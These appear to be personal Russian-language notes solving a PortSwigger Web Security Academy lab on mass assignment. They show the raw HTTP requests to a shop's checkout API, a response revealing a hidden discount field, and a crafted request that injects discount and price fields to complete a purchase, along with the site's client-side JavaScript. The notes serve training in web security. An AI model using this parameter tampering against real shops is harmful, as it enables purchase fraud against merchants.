лаба https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability

#### Использование уязвимости массового назначения

задача - купить кожанку в магазине

--------
запрос на добав в корзину товара
```http
POST /cart HTTP/2
Host: 0afd0074042c92f38301e6c9008400a8.web-security-academy.net
Cookie: session=HxZ2KL4Re42eKx3bhg0sqa2FQXiTd1tC
Content-Length: 36
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0afd0074042c92f38301e6c9008400a8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0afd0074042c92f38301e6c9008400a8.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

productId=1&redir=PRODUCT&quantity=1
```

----

запрос - покупка товаров из корзины
```http
POST /api/checkout HTTP/2
Host: 0afd0074042c92f38301e6c9008400a8.web-security-academy.net
Cookie: session=k753u5rpRCfNQLvTEoPJV1tJSKt6KBaf
Content-Length: 53
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: text/plain;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Origin: https://0afd0074042c92f38301e6c9008400a8.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0afd0074042c92f38301e6c9008400a8.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"chosen_products":[{"product_id":"1","quantity":1}]}
```

ответ на этот запрос
```json
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 153

{"chosen_discount":

{"percentage":0},

"chosen_products":

[{
"product_id":"1",
"name":"Lightweight \"l33t\" Leather Jacket",
"quantity":3,
"item_price":133700}
]}

```
есть поле chosen_discount 
то есть - есть какой-то эндпоинт который еще и отправит скидку!

---

попробую пропихнуть все это в обычном запросе на покупку
```http
POST /api/checkout HTTP/2
Host: 0afd0074042c92f38301e6c9008400a8.web-security-academy.net
Cookie: session=HxZ2KL4Re42eKx3bhg0sqa2FQXiTd1tC
Content-Length: 53
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Content-Type: text/plain;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Origin: https://0afd0074042c92f38301e6c9008400a8.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0afd0074042c92f38301e6c9008400a8.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"100","name":"Lightweight \"l33t\" Leather Jacket","quantity":3,"item_price":133700}]}

```


отправил! и вуаля - получилось купить!

лаба решена!

то есть просто напросто эндпоинт висел со скидкой в открытом виде полностью

и любой школоло с бурпом мог бы творить дичь

-----







нашел js файл  - висел  в карте сайта!
это какие-то функции отвечающие за покупки
видимо при покупке - выполняются эти функции

и тут есть функция  getProductIdsAndQuantitiesFromOrder
и видно  - что она отправляет на сервер стандартный запрос без скидки
а вот сервер нам отвечает стандартным полным json ответом - где видно и скидку тоже!
ну а далее - дело уже в том - что сервер принимал от меня любые данные, в том числе и с полными параметрами со скидкой - хотя должен был блокировать это

и вообще - какого фига - системный файл висит в открытом виде?


```js
const getProductIdsAndQuantitiesFromOrder = (order) => {
    return { chosen_products: order.chosen_products.map(product => ({ product_id: product.product_id, quantity: product.quantity })) };
}
```

```js
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: public, max-age=3600
X-Frame-Options: SAMEORIGIN
Content-Length: 2017

var cachedOrder = null;

const element = (selector) => {
    const e = document.querySelector(selector);

    if (e == null) {
        throw new Error("Failed to find item with selector: " + selector);
    }

    return e;
}

const centsToPriceString = (cents) => {
    return "$" + Math.floor(cents / 100) + "." + padCents(cents % 100);
}

const htmlProductList = (products) => {
    let html = "";

    products.forEach(product => {
        const rowHtml = buildProductRow(product.product_id, product.name, centsToPriceString(product.item_price), product.quantity);
        html += rowHtml;
    });

    return html;
}

const calculateTotalFromProducts = (products) => {
    return products.reduce((total, product) => total + product.item_price, 0);
}

const padCents = (cents) => {
    const s = String(cents);
    if (s.length < 2) {
        return "0" + s;
    } else {
        return s;
    }
}

const loadOrder = (order) => {
    element("#cart-items > tbody").innerHTML = htmlProductList(order.chosen_products);
    element("#cart-total").innerHTML = centsToPriceString(calculateTotalFromProducts(order.chosen_products));
};

const getProductIdsAndQuantitiesFromOrder = (order) => {
    return { chosen_products: order.chosen_products.map(product => ({ product_id: product.product_id, quantity: product.quantity })) };
}

const doLoadCart = () => {
    fetch(
        getApiEndpoint(),
        {
            method: 'GET'
        }
    )
        .then(res => res.json())
        .then(order => { cachedOrder = getProductIdsAndQuantitiesFromOrder(order); loadOrder(order); });
}

const doCheckout = (event) => {
    event.preventDefault();

    if (cachedOrder == null) {
        throw new Error("No cached order found!");
    }

    fetch(
        getApiEndpoint(),
        {
            method: 'POST',
            body: JSON.stringify(cachedOrder)
        }
    )
        .then(res => res.headers.get("Location"))
        .then(loc => window.location = loc);
};

window.onload = () => {
    doLoadCart();
}

```